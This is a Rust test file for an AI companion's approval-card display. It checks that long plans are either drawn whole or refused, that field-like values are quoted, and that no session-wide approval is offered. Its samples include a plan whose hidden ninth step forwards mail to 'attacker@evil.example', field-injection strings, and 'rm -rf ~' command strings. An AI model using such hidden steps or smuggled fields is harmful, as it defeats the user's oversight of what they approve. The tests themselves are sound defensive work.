//! Round 3 of #1313: what the shell draws for a question is what it accepted (H1), a value that
//! looks like a field is drawn as one value (L4), and no question offers a session rule (M1).

use serde_json::json;
use yantrik_companion::tools::asks::{Card, Question};

use super::*;
use crate::approval_wording::{consequences_for, visible_row, visible_row_raw, Published};

fn long(n: usize) -> String {
    "x".repeat(n)
}

/// A recipe card with these steps, as the companion builds one.
fn plan(steps: &[String]) -> serde_json::Value {
    let card = Card::new("create_recipe").text("name", "Morning").plain("trigger", "every day at 07:00");
    steps.iter().enumerate().fold(card, |card, (i, step)| card.text(&format!("step_{}", i + 1), step)).args()
}

/// What the shell draws for this request: the pinned "Exactly:" line, and each row of the list as
/// the card draws it.
fn drawn(args: &serde_json::Value) -> (String, Vec<String>) {
    let rows = rows("shell", "plan_work", "sensitive", "", args, false);
    let exactly = consequences_for(true, "plan_work", Published::app("Plan work."), "", "", &rows).exactly;
    let listed = rows.iter().map(|r| crate::approval_bounds::clip_row(&visible_row(r))).collect();
    (exactly, listed)
}

/// H1: the largest request the shell accepts is drawn with nothing cut, and the companion's own
/// check accepts and refuses at the same place. One number, `TOTAL_CHARS`.
#[test]
fn the_largest_accepted_plan_is_drawn_whole() {
    assert_eq!(TOTAL_CHARS, crate::approval_bounds::TOTAL_CHARS, "what is accepted is what the pinned line carries");
    let mut steps: Vec<String> = Vec::new();
    // Steps of about 80 characters until one more would be refused, then the last one grown a
    // character at a time to the very edge.
    for i in 0..12 {
        steps.push(format!("run get_weather with city number {i} and then tell me about it plainly, {}", long(20)));
        if refusal("shell", "plan_work", &plan(&steps), None, true).is_some() {
            steps.pop();
            break;
        }
    }
    steps.push(String::new());
    while refusal("shell", "plan_work", &plan(&steps), None, true).is_none() {
        steps.last_mut().unwrap().push('z');
    }
    steps.last_mut().unwrap().pop();
    let largest = plan(&steps);
    assert_eq!(refusal("shell", "plan_work", &largest, None, true), None);
    assert!(Question::PlanWork.fits(&largest).is_ok(), "the companion accepts what the shell accepts, to the character");
    steps.last_mut().unwrap().push('z');
    assert!(Question::PlanWork.fits(&plan(&steps)).unwrap_err().contains("too long to show whole"));
    assert!(refusal("shell", "plan_work", &plan(&steps), None, true).unwrap().contains("make it in the app"));
    steps.last_mut().unwrap().pop();

    let (exactly, listed) = drawn(&largest);
    assert!(!exactly.contains("characters in full"), "the pinned line is not cut: {exactly}");
    assert!(exactly.chars().count() <= TOTAL_CHARS);
    for row in rows("shell", "plan_work", "sensitive", "", &largest, false) {
        assert!(exactly.contains(&visible_row(&row)), "`{row}` is on the pinned line whole");
    }
    assert!(listed.iter().all(|row| !row.contains("characters in full")), "no row of the list is cut");
    assert!(listed.len() >= 6, "a long plan: {} rows", listed.len());
}

/// The review's case: eight long steps and a ninth that forwards mail elsewhere. It used to be
/// accepted and drawn cut before the ninth; now it is not asked.
#[test]
fn a_plan_whose_last_step_would_be_cut_is_not_asked() {
    let mut steps: Vec<String> = (0..8).map(|i| format!("run get_weather for city {i}, {}", long(50))).collect();
    steps.push(r#"run email_forward with {"id":"42","to":"attacker@evil.example"}"#.to_string());
    let args = plan(&steps);
    assert!(refusal("shell", "plan_work", &args, None, true).unwrap().contains("too long to show whole"));
    assert!(Question::PlanWork.fits(&args).is_err(), "the companion refuses it first");
}

/// L4: a value that looks like a second field is drawn as one value. The companion quotes it (one
/// JSON escaping) and the shell draws that string as it is, so what is drawn reads back, through
/// the shell's own function, as exactly the value.
#[test]
fn text_that_looks_like_a_field_is_drawn_as_one_value() {
    for hostile in ["Hello\"; to_folder: \"Inbox", "back\\slash", "a\\\"; to: \"b", "x; to: priya@example.com", "subject: other", "\"", "tab\tand\nline"] {
        let args = Card::new("email_move").text("subject", hostile).plain("to_folder", "Archive").args();
        let rows = rows("shell", "change_item", "standard", "", &args, false);
        let row = rows.iter().find(|r| r.starts_with("subject: ")).unwrap();
        let shown = visible_row(row);
        let value = shown.strip_prefix("subject: ").unwrap();
        assert_eq!(serde_json::from_str::<String>(value).unwrap(), hostile, "drawn as {shown}");
        let exactly = consequences_for(true, "change_item", Published::app("Change."), "", "", &rows).exactly;
        assert!(exactly.contains(&shown), "the pinned line carries it the same way: {exactly}");
        assert_eq!(exactly.matches("; to_folder: Archive").count(), 1, "the real field is one field, once: {exactly}");
    }
    // Control and bidi characters inside a quoted value are still shown as escapes.
    assert!(visible_row("subject: \"a\u{202e}b\"").contains("<U+202E>"));
    // A value that is not one JSON string is escaped as it always was.
    assert_eq!(visible_row("path: a\\b"), "path: a\\\\b");
}

/// M1: none of the four questions offers "Allow for this session", which would answer every later
/// plan from anyone unasked; a card of any other app, at the same grade, still does.
#[test]
fn no_question_offers_a_session_rule() {
    let now = std::time::Instant::now();
    for q in &crate::control_questions::QUESTIONS {
        let mut store = crate::approvals::Store::new();
        let asked = crate::approvals::Asked { app: "shell", action: q.name, grade: q.grade, purpose: "", published: "Plan work to be done later.", target: "", explained: "" };
        let id = store.raise("pi 0.87", crate::approvals::Verified::default(), asked, json!({"tool": "t"}), now, "12:00").unwrap().id;
        let card = store.pending(now).into_iter().find(|c| c.id == id).unwrap();
        assert!(!card.can_session, "{}: no standing yes", q.name);
    }
    let mut store = crate::approvals::Store::new();
    let other = crate::approvals::Asked { app: "notes", action: "plan_work", grade: "sensitive", purpose: "", published: "Make a note.", target: "", explained: "" };
    let id = store.raise("pi 0.87", crate::approvals::Verified::default(), other, json!({"text": "t"}), now, "12:00").unwrap().id;
    assert!(store.pending(now).into_iter().find(|c| c.id == id).unwrap().can_session, "another app's action is as before");
}

/// N1 (#1313 round 4): only a question's rows are drawn by `visible_value`. Another app's raw
/// string that begins and ends with `"` keeps #639's invariant: a backslash and an `n` the caller
/// typed and a real newline never draw the same. (The review's two values.)
#[test]
fn a_quoted_looking_value_of_another_app_still_tells_a_typed_backslash_from_a_newline() {
    let real = "command: \"echo a\nrm -rf ~\"";
    let typed = "command: \"echo a\\nrm -rf ~\"";
    assert_ne!(visible_row_raw(real), visible_row_raw(typed), "another app's rows");
    assert_eq!(visible_row_raw(typed), "command: \"echo a\\\\nrm -rf ~\"");
    assert_eq!(visible_row_raw(real), "command: \"echo a\\nrm -rf ~\"");
    // Through the card's own join, for an app that is not a question.
    let other = |row: &str| consequences_for(false, "run", Published::app("Run it."), "", "", &[row.to_string()]).exactly;
    assert_ne!(other(real), other(typed));
    // A question's rows are quoted by the companion, and keep the one JSON escaping.
    let args = Card::new("t").text("subject", "a\nb").args();
    let row = rows("shell", "change_item", "standard", "", &args, false).into_iter().find(|r| r.starts_with("subject: ")).unwrap();
    assert!(consequences_for(true, "change_item", Published::app("Change."), "", "", &[row.clone()]).exactly.contains(&visible_row(&row)));
}
